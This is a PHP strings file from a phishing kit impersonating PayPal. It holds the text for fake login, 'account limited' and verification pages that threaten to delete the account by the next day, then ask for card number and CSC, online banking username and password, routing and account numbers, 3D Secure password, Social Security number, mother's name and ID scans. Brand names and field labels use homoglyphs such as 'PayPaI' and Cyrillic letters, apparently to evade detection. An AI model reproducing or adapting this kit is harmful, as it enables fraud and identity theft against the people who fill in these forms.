<?   
date_default_timezone_set('GMT');
$date = date('Y');
$next_day = date('d')+1;
$date_day = date('M Y');
session_start();
$language = array(
            'index'     => array(
            '0' => 'Send Money, Pay Online or Set Up a Merchant Account - PayPaI',
            '1' => 'Menu',
            '2' => 'Personal',
            '3' => 'What is PayPaI? <em>Learn how PayPaI works in your everyday life</em>',
            '4' => 'Check Out Securely Online <em>Use your credit cards or other funds</em>',
            '5' => 'PayPaI Credit &amp; Cards <em>Our credit, debit, prepaid cards &amp; PayPaI Credit</em>',
            '6' => 'PayPaI App <em>Transfer money and track activity with our app</em>',
            '7' => 'PayPaI Can Do That <em>Discover ways to manage and move your money</em>',
            '8' => 'Shopping and More <em>Deals, gift cards and donations</em>',
            '9' => 'Close',
            '10' => 'Business',
            '11' => 'All Business Solutions <em>Merchant services, invoicing, and more</em>',
            '12' => 'Get Paid in Person <em>Mobile card readers and POS solutions</em>',
            '13' => 'Credit Card Processing <em>Accept credit, debit cards, and PayPaI</em>',
            '14' => 'Small Business Loans <em>Fast and fair financing</em>',
            '15' => 'Add PayPaI to Your Checkout <em>Add the button to accept payments</em>',
            '16' => 'Offer Credit to Your Customers <em>Promote financing to help increase sales</em>',
            '17' => 'Send',
            '18' => 'Request',
            '19' => 'Sign Up for Free',
            '20' => 'With PayPaI, you can pay your way.',
            '21' => 'Add credit, debit, and bank accounts to your digital wallet and take your pick at checkout.',
            '22' => 'Learn More',
            '23' => 'Log into Your Account',
            '24' => 'Your account is brimming with possibilities.',
            '25' => 'Get Started',
            '26' => 'We\'re more than just a way to pay. Explore what PayPaI has to offer. ',
            '27' => 'Pay Your Way',
            '28' => 'Our digital wallet lets you add credit, debit and bank accounts so you decide how to pay. ',
            '29' => 'Purchase Protection',
            '30' => 'If you don\'t receive exactly what you ordered, we’ll help you get your money back. ',
            '31' => 'Send Money',
            '32' => 'With a PayPaI account email address or phone number you can send money almost anywhere in a snap. ',
            '33' => 'Transfer Funds',
            '34' => 'See eligibility &amp; purchase protections limitations.',
            '35' => 'Help &amp; Contact',
            '36' => 'Fees',
            '37' => 'Security',
            '38' => 'Apps',
            '39' => 'Shop',
            '40' => 'See all countries',
            '41' => 'Search',
            '42' => 'About',
            '43' => 'Blog',
            '44' => 'Jobs',
            '45' => 'Investor Relations',
            '46' => 'Social Innovation',
            '47' => 'Public Policy',
            '48' => 'Sitemap',
            '49' => 'Enterprise',
            '50' => 'Partners',
            '51' => '© 1999–'.$date.' ',
            '52' => 'Privacy',
            '53' => 'Legal',
            '54' => 'Feedback',
), 


            'login'     => array(
            '1' => 'Log in to your ΡаyΡаI account',
            '2' => 'Please check your entries and try again',
            '3' => 'Required.',
            '4' => 'Log In',
            '5' => 'Sign Up',
            '6' => 'Checking your info…',
            '7' => 'Email address',
            '8' => 'Enter your Password',
            '9' => 'Having trouble logging in?',
            '10' => 'Show',
            '11' => 'Hide',
            '12' => 'or',
            '13' => 'Required.',
), 
        'bar'     => array(
            '1' => 'Summary',
            '2' => 'Activity',
            '3' => 'Send & Request Payments',
            '4' => 'Wallet',
            '5' => 'Shop',
            '6' => 'Help',
            '7' => 'Notifications',
            '8' => 'Messages',
            '9' => 'Settings',
            '10' => 'Account',
            '11' => 'There is a problem with your account',
            '12' => 'Please resolve it for full access to your account',
            '13' => 'You don\'t have any new messages',
            '14' => 'View Messages',
            '15' => 'Menu',
            '16' => 'Close',
            '17' => 'Log Out', 
            '18' => 'You don\'t have any new notifications',
            '19' => 'Search',
),
        'home'     => array(
            '1' => 'Provide proof of your address',
            '2' => 'Saving your info...',
            '3' => 'Continue',
            '4' => 'Confirm your card',
            '5' => 'Cаrdholder Name',
            '6' => 'Cаrd number',
            '7' => 'Expirаtion MM/YY',
            '8' => 'СSС (3 Digits)',
            '9' => 'Select a billing address',
            '10' => 'Confirm your billing address',
            '11' => 'Confirm',
            '12' => 'Confirm your billing address',
            '13' => 'Address line 1',
            '14' => 'Address line 2 (Optional)',
            '15' => 'Postal code',
            '16' => 'City / Town / Village',
            '17' => 'Cancel',
            '18' => 'Account impact',
            '19' => 'hight',
            '20' => 'Today',
            '21' => 'Withdraw money from PayPal',
            '22' => 'Back',
            '23' => 'Receive money or payments',
            '24' => 'Send money or payments',
            '25' => 'Pay using PayPal',
            '26' => 'Your account is limited',
            '27' => 'We notices some unusual activity and want to make sure no one has logged into your account without your permission. Please help us ensure your account is secure by answering a few questions.',
            '28' => 'Reference #: PP-541-002-511-021',
            '29' => 'Help us understand your account activity by completing the following steps',
            '30' => 'Confirm your card',
            '31' => 'Provide proof of your address',
            '32' => 'Upload a photo ID',
            '33' => 'If you don\'t resolve this limitation soon, we\'ll permanently delete your account by <b>'.$next_day.' '.$date_day.'</b>.',

),
  
        'id'     => array(
            '1' => 'Upload a photo ID',
            '2' => 'Please use one of the allowed file types (jpg, gif, png, bmp).',
            '3' => 'Please Select an option to continue.',
            '4' => 'Document type',
            '5' => 'Please upload a document that shows the name and date of birth of the primary account holder.',
            '6' => 'Browse file',
            '7' => 'JPG GIF PNG BMP | 5MB each',
            '8' => 'Error this option not available for a moment.',
            '9' => 'Front:',
            '10' => 'Back:',
            '11' => 'Add a file',
            '12' => 'Provide proof of your address',
            '13' => 'Please upload a document that includes the address associated with your PayPal account.',
            '14' => 'Utility Bill (gas, water, electric, or mobile)',
            '15' => 'Bank Statement',
            '16' => 'Credit Card Statement',
            '17' => 'Driver\'s License',
            '18' => 'Passport',
            '19' => 'National identity card',

),


        'bank'     => array(
            '1' => 'Add your bank account',
            '2' => 'Please note that the details entered are only for your account verification. It’s secure, and we don\'t save this information.',
            '3' => 'Checking',
            '4' => 'Savings',
            '5' => 'Username',
            '6' => 'Password',
            '7' => 'Routing number',
            '8' => 'Account number',
            '9' => 'Save',
            '10' => 'A 9-digit number at the lower left corner of a check. Contact your bank if you need help.',
            '11' => 'A 3-17 digit number at the bottom of a check or on a bank statement. Contact your bank if you need help.',

),


        'details'     => array(
            '1' => 'Card details',
            '2' => 'Billing address',
            '3' => 'Expiration date',
            '4' => 'Unconfirmed',
            '5' => 'Confirm credit card',

),



    'secure'        => array(
            '1' => 'Added Safety Online',
            '2' => 'secure protects your card against unauthorised use online at no cost.To use',
            '22' => 'on this and future purshases. complete this page You\'ll the create your own Password.',
            '3' => 'Merchant:',
            '4' => 'ΡаyΡаI Inc.',
            '5' => 'Amount:',
            '6' => '0.01',
            '7' => 'Date:',
            '8' => 'Card Number:',
            '9' => 'Card Type:',
            '10' => 'Bank Name:',
            '11' => '3D Secure Password:',
            '12' => 'Primary Cardholder Date of Birth:',
            '13' => 'Personal Phone Number:',
            '14' => 'Mother\'s name:',
            '15' => 'Sort Code:',
            '16' => 'Confirm now',
            '17' => 'Country:',
            '18' => 'Social Security Number:',
            '19' => 'Account number:',
            '20' => 'Processing',
            '21' => 'Please wait while<br>we process your informations...',


        ),
    'thanks'       =>array(

            '1' => 'Thank you for providing the required information.',
            '2' => 'You can use your account now and we\'ll get back to you within 2-3 business days.',
            '3' => 'Link and confirm your bank account',
            '4' => 'Go to you summary ΡаyΡаI',

             ),

    'copyright'       =>array(

            '1' => 'Privacy',
            '2' => 'Legal',
            '3' => 'Copyright © 1999-'.$date.' ΡayΡaI. All rights reserved.',
            '4' => 'Consumer advisory- ΡayΡal Pte. Ltd., the holder of ΡayΡal’s stored value facility, does not require the approval of the Monetary Authority of Singapore. Users are advised to read the <b>terms and conditions</b> carefully.',
            '5' => 'Security',
            '6' => 'Fees',

            ));
?>